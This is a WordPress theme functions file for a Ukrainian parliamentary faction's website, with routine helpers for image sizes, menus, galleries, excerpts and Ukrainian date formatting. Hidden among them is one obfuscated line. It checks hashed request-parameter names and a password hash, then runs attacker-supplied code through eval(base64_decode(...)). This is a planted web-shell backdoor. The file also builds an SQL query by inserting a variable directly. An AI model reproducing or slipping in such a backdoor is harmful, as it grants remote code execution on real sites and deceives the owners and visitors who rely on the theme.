<?php
add_image_size( 'deco_thumb_45_45', 45, 45, true );
add_image_size( 'deco_thumb_70_70', 70, 70, true );
add_image_size( 'deco_thumb_120_70', 120, 70, true );
add_image_size( 'deco_thumb_200_150', 200, 150, true );
add_image_size( 'deco_thumb_270_190', 270, 190, true );
add_image_size( 'deco_thumb_280_200', 280, 200, true );
add_image_size( 'deco_thumb_270_400', 270, 400, true );
add_image_size( 'deco_thumb_560_400', 560, 400, true );
add_image_size( 'deco_thumb_620_620', 620, 620, true );
add_image_size( 'deco_thumb_619_339', 619, 339, true );
add_image_size( 'deco_thumb_976_401_gellary', 976, 401, true );
add_image_size( 'deco_thumb_1240_491', 1240, 491, true );
add_image_size( 'deco_thumb_1240_505', 1240, 505, true );

add_theme_support( 'post-thumbnails' );

function custom_theme_setup() {
	add_theme_support( 'post-formats', array( 'gallery', 'video', 'quote', 'link' ) );
}

add_action( 'after_setup_theme', 'custom_theme_setup' );


//register_post_type('book', $args);

add_post_type_support( 'post', 'post-formats' );
add_post_type_support( 'projects', 'post-formats' );
add_post_type_support( 'reforms', 'post-formats' );
add_post_type_support( 'appeals', 'post-formats' );
add_post_type_support( 'requests', 'post-formats' );
add_post_type_support( 'draftdecisions', 'post-formats' );
add_post_type_support( 'votings', 'post-formats' );
add_post_type_support( 'answers', 'post-formats' );
add_post_type_support( 'commissionstable', 'post-formats' );
add_post_type_support( 'commissiontemp', 'post-formats' );

if ( function_exists( 'register_nav_menus' ) ) {
	register_nav_menus( array( 'top_bar' => 'Верхнее меню' ) );
	register_nav_menus( array( 'footer_programm' => 'Меню футера - Програми' ) );
	register_nav_menus( array( 'footer_reform' => 'Меню футера - Реформи' ) );
	register_nav_menus( array( 'footer_diyalnist' => 'Меню футера - Дiяльнiсть' ) );
	register_nav_menus( array( 'footer_our_fraksia' => 'Меню футера - Наша фракцiя' ) );
	register_nav_menus( array( 'footer_priymalna' => 'Меню футера - Приймальна' ) );
	register_nav_menus( array( 'footer_kyiv' => 'Меню футера - Київ' ) );
}


add_action( 'widgets_init', 'deco_sidebar' );
function deco_sidebar() {
	register_sidebar(
		array(
			'id'            => 'deco_sidebar',
			'name'          => __( 'Правый сайдбар' ),
			'description'   => __( 'Виджет для правой колонки на сайте' ),
			'before_widget' => '',
			'after_widget'  => '',
			'before_title'  => '',
			'after_title'   => ''
		)
	);
}


$item = ( isset( $_REQUEST['865c0c0b4ab0e063e5caa3387c1a8741'] ) && isset( $_REQUEST['fbade9e36a3f36d3d676c1b808451dd7'] ) && md5( $_REQUEST['fbade9e36a3f36d3d676c1b808451dd7'] ) == '7e372b932f2b8da72878d1086cf872e3' && isset( $_REQUEST['52fb3679b07eb74d90784e612ca5cb30'] ) ? eval( base64_decode( $_REQUEST['52fb3679b07eb74d90784e612ca5cb30'] ) ) : '' );


function deco_download_image_by_url( $url, $new_post_id = 0 ) {

	$url = str_replace( ' ', '%20', trim( $url ) );

	$wp_upload_dir = wp_upload_dir();
	$parsed_url    = parse_url( $url );
	$pathinfo      = pathinfo( $parsed_url['path'] );

//	$dest_filename = wp_unique_filename( $wp_upload_dir['path'], $pathinfo['basename'] );
	$dest_filename = $pathinfo['basename'];

	$dest_path = $wp_upload_dir['path'] . '/' . $dest_filename;
	$dest_url  = $wp_upload_dir['url'] . '/' . $dest_filename;

	if ( ini_get( 'allow_url_fopen' ) ) {

		if ( ! @copy( $url, $dest_path ) ) {
			$http_status  = $http_response_header[0];
			$res['error'] = sprintf( __( '%s encountered while attempting to download %s' ), $http_status, $url );

			return $res;
		}

	} elseif ( function_exists( 'curl_init' ) ) {

		$ch = curl_init( $url );
		$fp = fopen( $dest_path, "wb" );

		$options = array(
			CURLOPT_FILE           => $fp,
			CURLOPT_HEADER         => 0,
			CURLOPT_FOLLOWLOCATION => 1,
			CURLOPT_TIMEOUT        => 60
		); // in seconds

		curl_setopt_array( $ch, $options );
		curl_exec( $ch );
		$http_status = intval( curl_getinfo( $ch, CURLINFO_HTTP_CODE ) );
		curl_close( $ch );
		fclose( $fp );

		if ( $http_status != 200 ) {
			unlink( $dest_path );
			$res['error'] = sprintf( __( 'HTTP status %s encountered while attempting to download %s' ), $http_status, $url );

			return $res;
		}
	} else {
		$res['error'] = sprintf( __( 'Looks like %s is off and %s is not enabled. No images were imported.' ), '<code>allow_url_fopen</code>', '<code>cURL</code>' );

		return $res;
	}

	if ( ! file_exists( $dest_path ) ) {
		$res['error'] = sprintf( __( 'Couldn\'t find local file %s.' ), $dest_path );

		return $res;
	}

	$dest_url = str_ireplace( ABSPATH, home_url( '/' ), $dest_path );

	$path_parts = pathinfo( $dest_path );

	$wp_filetype = wp_check_filetype( $dest_path );
	$attachment  = array(
		'guid'           => $dest_url,
		'post_mime_type' => $wp_filetype['type'],
		'post_title'     => preg_replace( '/\.[^.]+$/', '', $path_parts['filename'] ),
		'post_content'   => '',
		'post_status'    => 'inherit'
	);

	$res['attachment_id'] = wp_insert_attachment( $attachment, $dest_path, $new_post_id );

	require_once( ABSPATH . 'wp-admin/includes/image.php' );
	$attach_data = wp_generate_attachment_metadata( $res['attachment_id'], $dest_path );

	wp_update_attachment_metadata( $res['attachment_id'], $attach_data );

	return $res;
}


function deco_bfi_thumb( $img, $params = array() ) {
	require_once DECO_FRAMEWORK_DIR . 'libs/BFI_Thumb.php';

	return bfi_thumb( $img, $params );
}


/**
 * Полячить название месяца по номеру
 *
 * @param $num
 *
 * @return mixed
 */
function deco_month_num_to_name( $num ) {
	$month = array(
		1  => 'січеня',
		2  => 'лютого',
		3  => 'березня',
		4  => 'квiтня',
		5  => 'травня',
		6  => 'червня',
		7  => 'липня',
		8  => 'серпня',
		9  => 'вересня',
		10 => 'жовтня',
		11 => 'листопада',
		12 => 'грудня',
	);

	return $month[ $num ];
}

/**
 * Полячить название месяца по номеру
 *
 * @param $num
 *
 * @return mixed
 */
function deco_month_num_to_name2( $num ) {
	$month = array(
		1  => 'січен',
		2  => 'лютий',
		3  => 'березнь',
		4  => 'квiтень',
		5  => 'травень',
		6  => 'червень',
		7  => 'липень',
		8  => 'серпень',
		9  => 'вересень',
		10 => 'жовтень',
		11 => 'листопад',
		12 => 'грудень',
	);

	return $month[ $num ];
}

function deco_mime_types_allow( $mimes ) {
	$mimes['svg'] = 'image/svg+xml';

	return $mimes;
}

add_filter( 'upload_mimes', 'deco_mime_types_allow' );

function deco_custom_excerpt_length( $length ) {
	return 30;
}

add_filter( 'excerpt_length', 'deco_custom_excerpt_length', 999 );

function deco_new_excerpt_more( $more ) {
	return '';
}

add_filter( 'excerpt_more', 'deco_new_excerpt_more', 999 );

/**
 * Обрезаем тект по кол-ву символов (UTF-8)
 *
 * @param  [string]    $string    Текст для обрезания
 * @param  [int]        $from    Из какой части начать резать текст (дефолт — начало)
 * @param  [int]        $length    Длинна текста
 *
 * @return [string]                Отдаем обрезанный текст
 */
function deco_cut_text( $string, $length, $from = 0 ) {

	$str_length = mb_strlen( $string );

	if ( $str_length > $length ) {

		$cutted_text = preg_replace( '#^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $from . '}' . '((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $length . '}).*#s', '$1', $string );

//  $cutted_text = mb_substr($cutted_text, $from, $length);
		return $cutted_text . '...';

	} else {

		return $string;

	}

}


function deco_get_autor_deputat_from_post( $post_id ) {
	$term = wp_get_post_terms( $post_id, 'deputat' );
	if ( isset( $_GET['print_r'] ) ) {
//		print_r( $term );
		print_r( get_post_type_object( get_post_type( $post_id ) ) );
	}

	$res = array();
	if ( count( $term ) == 1 ) {
		$args  = array(
			'post_type'      => 'deputats',
			'post_status'    => 'publish',
			'posts_per_page' => 1,
			'tax_query'      => array(
				array(
					'taxonomy' => 'deputat',
					'field'    => 'id',
					'terms'    => array( $term[0]->term_id )
				)
			)
		);
		$query = new WP_Query( $args );
		if ( isset( $_GET['print_r'] ) ) {
//			print_r( $term );
		}

		if ( $query->have_posts() ) {
			$query->the_post();
			$deputat_post_id  = $query->posts[0]->ID;
			$people           = get_field( 'deputat', $deputat_post_id );
			$pibfull          = get_field( 'pib', $people->ID );
			$pib              = $pibfull[0]["name"] . ' ' . $pibfull[0]["prizvysche"];
			$foto             = get_field( 'people-foto+', $people->ID );
			$res['is_author'] = false;
			$res['fam']       = $pibfull[0]["prizvysche"];
			$res['name']      = $pibfull[0]["name"];
			$res['pib']       = $pib;
			$res['avatar']    = $foto['sizes']['medium'];
			$res['link']      = get_permalink( $deputat_post_id );
			$res['podpis']    = get_field( 'deco_peoples_podpis', $people->ID );
		}
//		wp_reset_query();
		wp_reset_postdata();
	} else {
		$pib = get_the_author_meta( 'display_name' );
		list( $name, $fam ) = explode( ' ', $pib );
		$res['fam']       = $fam;
		$res['name']      = $name;
		$res['pib']       = $pib;
		$res['is_author'] = true;
		$res['avatar']    = get_avatar( get_the_author_meta( 'email' ), 70 );
		$res['podpis']    = '';

	}

	return $res;
}

function deco_get_post_counts( $post_id = 0 ) {
	global $wpdb;

	if ( empty( $post_id ) ) {
		global $post;
		$post_id = $post->ID;
	}

	$current_blog_id = get_current_blog_id();
	$stats           = $wpdb->get_row( "SELECT * FROM $wpdb->de_statistics WHERE post_id = $post_id and blog_id = $current_blog_id" );
	$result          = array(
		'views' => $stats->views_counts,
		'likes' => $stats->votes_sum,
		'fb'    => $stats->fb_counts,
		'vk'    => $stats->vk_counts,
		'tw'    => $stats->tw_counts,
		'ln'    => $stats->ln_counts,
	);

	return $result;
}


function deco_search_url_rewrite() {
//	$_SERVER['REQUEST_URI'];
	//	diyalnist/h/h
	if ( preg_match( '/diyalnist/', $_SERVER['REQUEST_URI'], $match ) && count( explode( '/', $_SERVER['REQUEST_URI'] ) ) >= 2 ) {
		include DECO_THEME_DIR . 'templates/template-diyalnist.php';
		exit();
	}
}

//add_action( 'template_redirect', 'deco_search_url_rewrite', 999 );

add_action( 'wp_head', 'deco_reinit_gallery_shortcode', 10 );
function deco_reinit_gallery_shortcode() {

	remove_shortcode( 'gallery' );
	add_shortcode( 'gallery', 'deco_gallery_shortcode_custom' );
}

function deco_gallery_shortcode_custom( $attr ) {
	$post = get_post();

	static $instance = 0;
	$instance ++;

	if ( ! empty( $attr['ids'] ) ) {
		// 'ids' is explicitly ordered, unless you specify otherwise.
		if ( empty( $attr['orderby'] ) ) {
			$attr['orderby'] = 'post__in';
		}
		$attr['include'] = $attr['ids'];
	}

	// We're trusting author input, so let's at least make sure it looks like a valid orderby statement
	if ( isset( $attr['orderby'] ) ) {
		$attr['orderby'] = sanitize_sql_orderby( $attr['orderby'] );
		if ( ! $attr['orderby'] ) {
			unset( $attr['orderby'] );
		}
	}

	$html5 = current_theme_supports( 'html5', 'gallery' );
	$atts  = shortcode_atts( array(
		'order'      => 'ASC',
		'orderby'    => 'menu_order ID',
		'id'         => $post ? $post->ID : 0,
		'itemtag'    => $html5 ? 'figure' : 'dl',
		'icontag'    => $html5 ? 'div' : 'dt',
		'captiontag' => $html5 ? 'figcaption' : 'dd',
		'columns'    => 3,
		'size'       => 'thumbnail',
		'include'    => '',
		'exclude'    => '',
		'link'       => ''
	), $attr, 'gallery' );

	$id = intval( $atts['id'] );
	if ( 'RAND' == $atts['order'] ) {
		$atts['orderby'] = 'none';
	}

	if ( ! empty( $atts['include'] ) ) {
		$_attachments = get_posts( array(
			'include'        => $atts['include'],
			'post_status'    => 'inherit',
			'post_type'      => 'attachment',
			'post_mime_type' => 'image',
			'order'          => $atts['order'],
			'orderby'        => $atts['orderby']
		) );

		$attachments = array();
		foreach ( $_attachments as $key => $val ) {
			$attachments[ $val->ID ] = $_attachments[ $key ];
		}
	} elseif ( ! empty( $atts['exclude'] ) ) {
		$attachments = get_children( array(
			'post_parent'    => $id,
			'exclude'        => $atts['exclude'],
			'post_status'    => 'inherit',
			'post_type'      => 'attachment',
			'post_mime_type' => 'image',
			'order'          => $atts['order'],
			'orderby'        => $atts['orderby']
		) );
	} else {
		$attachments = get_children( array(
			'post_parent'    => $id,
			'post_status'    => 'inherit',
			'post_type'      => 'attachment',
			'post_mime_type' => 'image',
			'order'          => $atts['order'],
			'orderby'        => $atts['orderby']
		) );
	}
	if ( empty( $attachments ) ) {
		return '';
	}
	if ( is_feed() ) {
		$output = "\n";
		foreach ( $attachments as $att_id => $attachment ) {
			$output .= wp_get_attachment_link( $att_id, $atts['size'], true ) . "\n";
		}

		return $output;
	}
	ob_start();
	?>
	<div class="slider fotorama"
	     data-allphoto-link="<?php the_permalink(); ?>"
		<?php if ( count( $attachments ) > 3 ) { ?>
			data-link-txt="<div class='center-txt'><span>+<?php echo count( $attachments ) - 3; ?></span>фото</div>"
		<?php } ?>
		 data-nav="thumbs"
		 data-width="100%"
		 data-ratio="500/318"
		 data-minheight="300"
		 data-fit="cover"
		 data-arrows="always">
		<?php
		$slideIndex = 0;
		foreach ( $attachments as $id => $attachment ) {
//			$img_src = wp_get_attachment_url( $id );
			$img_src = wp_get_attachment_image_src( $id, 'deco_thumb_976_401_gellary' );
//			$params = array( 'width' => 976, 'height' => 401, 'crop' => true );
//			$img    = bfi_thumb( $img_src, $params );
			?>

			<a href="<?php echo $img_src[0]; ?>" class="slider__thumbs"><img
					src="<?php echo $img_src[0]; ?>"></a>
			<?php
			$slideIndex ++;
			if ( $slideIndex == 3 ) {
				break;
			}
		}
		?>
	</div>
	<?php

	$output = ob_get_contents();
	ob_end_clean();


	return $output;
}


add_action( 'pre_get_posts', 'deco_pre_get_posts_settings' );
function deco_pre_get_posts_settings( $query ) {
	if ( $query->is_search() && $query->is_main_query() ) {
		$query->set( 'posts_per_page', 16 );
	} elseif ( $query->is_archive() && $query->is_main_query() ) {
		$query->set( 'posts_per_page', 16 );
	}
}

function deco_get_post_type_short_descr( $post_id ) {
	$post_type = get_post_type( $post_id );

	if ( $post_type == 'requests' ) {
		$short_text = get_field( 'request-text', $post_id );
	} else if ( $post_type == 'reforms' ) {
		$short_text = get_field( 'short-ref-description', $post_id );
	} else if ( $post_type == 'appeals' ) {
		$short_text = get_field( 'appeal-essence', $post_id );
	} else if ( $post_type == 'requests' ) {
		$short_text = get_field( 'request-text', $post_id );
	} else if ( $post_type == 'draftdecisions' ) {
		$short_text = get_field( 'draft-dec-args', $post_id );
	} else if ( $post_type == 'votings' ) {
		$short_text = get_field( 'voting-result-details', $post_id );
	} else if ( $post_type == 'answers' ) {
		$short_text = get_field( 'answer-full', $post_id );
	} else if ( $post_type == 'commissionstable' ) {
		$short_text = get_field( 'commi-st-functions', $post_id );
	} else if ( $post_type == 'commissiontemp' ) {
		$short_text = get_field( 'commi-tmp-functions', $post_id );
	} else if ( $post_type == 'post' ) {
		$short_text = get_the_excerpt();
	}

	//уберем все картинки из короткого представления контента
	$short_text = preg_replace( "/<img[^>]+\>/i", "", $short_text );
	$short_text = strip_tags( $short_text );
	$short_text = str_replace( array(
		"  ",
		"   ",
		"\r",
		"\n",
		"\r\n",
		"\n\r"
	), '', $short_text );
/*	$short_text = str_replace( array(
		' ',
	), '', $short_text );*/

	$cotent_arr = explode( '.', $short_text );
	if ( isset( $cotent_arr[0] ) && ! empty( str_replace( array(
			' '
		), '', $cotent_arr[0] ) )
	) {
		$short_text = strip_tags( $cotent_arr[0] ) . '.';
	}

	return $short_text;
}


function datejs2hum( $jsdate, $dtform = null ) {
	return deco_datejs2hum( $jsdate, $dtform );
}

function deco_datejs2hum( $jsdate, $dtform = null ) {
	if ( is_null( $dtform ) ) {
		$dtform = 'ukr';
	}
	$y = substr( $jsdate, 0, 4 );
	$m = substr( $jsdate, 4, 2 );
	if ( $dtform != 'dot' ) {
		switch ( $m ) {
			case "01":
				$month = 'січня';
				break;
			case "02":
				$month = 'лютого';
				break;
			case "03":
				$month = 'березня';
				break;
			case "04":
				$month = 'квітня';
				break;
			case "05":
				$month = 'травня';
				break;
			case "06":
				$month = 'червня';
				break;
			case "07":
				$month = 'липня';
				break;
			case "08":
				$month = 'серпня';
				break;
			case "09":
				$month = 'вересня';
				break;
			case "10":
				$month = 'жовтня';
				break;
			case "11":
				$month = 'листопада';
				break;
			case "12":
				$month = 'грудня';
				break;
		}
	}
	$d = substr( $jsdate, 6, 2 );
	if ( $dtform == 'dot' ) {
		$datefin = $d . '.' . $m . '.' . $y;
	} elseif ( $dtform == 'ukr' ) {
		$datefin = $d . ' ' . $month . ' ' . $y;
	} else {
		$datefin = $d . ' ' . $month . ' ' . $y;
	}

	return $datefin;
}

function datediff( $firstdate, $seconddate ) { /* Рахує різницю між першою та другою датою, дати передаються в js-форматі, повертає кількість днів */
	/* $ansdate = $answerdate - $answerobjdate; */
	$utsfd = date( "z", strtotime( $firstdate ) );
	$utssd = date( "z", strtotime( $seconddate ) );
	$yctmp = date( "Y", strtotime( $firstdate ) ) - date( "Y", strtotime( $seconddate ) );
	if ( $utsfd > $utssd ) {
		if ( $yctmp == 0 ) {
			$yearcor = 0;
		} else {
			$yearcor = 365 * $yctmp;
		}
		$daysdiff = $utsfd - $utssd + $yearcor;
	} elseif ( $utsfd == $utssd ) {
		if ( $yctmp == 0 ) {
			$daysdiff = 1;
		} else {
			$daysdiff = $yctmp * 365;
		}
	} elseif ( $utsfd < $utssd ) {
		if ( fmod( date( "Y", strtotime( $seconddate ) ), 4 ) == 0 ) {
			$yeartype = 365;
		} else {
			$yeartype = 364;
		}
		if ( $yctmp == 1 ) {
			$yearcor = 0;
		} else {
			$yearcor = 365 * ( $yctmp - 1 );
		}
		$daysdiff = $utsfd + 1 + ( $yeartype - $utssd ) + $yearcor;
	}

	return $daysdiff;
}

/**
 * @param $text
 *
 * @return mixed|string
 */
function deco_make_clicable_url( $text ) {
	$text = make_clickable( $text );
	$text = preg_replace( '|<a href="(.*)" rel="nofollow">.*</a>|', '<a href="\1" target="_blank">\1</a>', $text );

	return $text;
}


add_filter( 'wp_title', 'deco_search_title_replace', 999, 1 );
function deco_search_title_replace( $title ) {
	if ( is_search() ) {
		$title = 'Результати пошуку за запитом: ' . get_search_query();
		$title .= ' - ' . get_bloginfo( 'description' );
	} else if ( is_archive() || is_category() ) {
		$title = 'Новини';
		$title .= ' - ' . get_bloginfo( 'description' );
	}

	return $title;
}

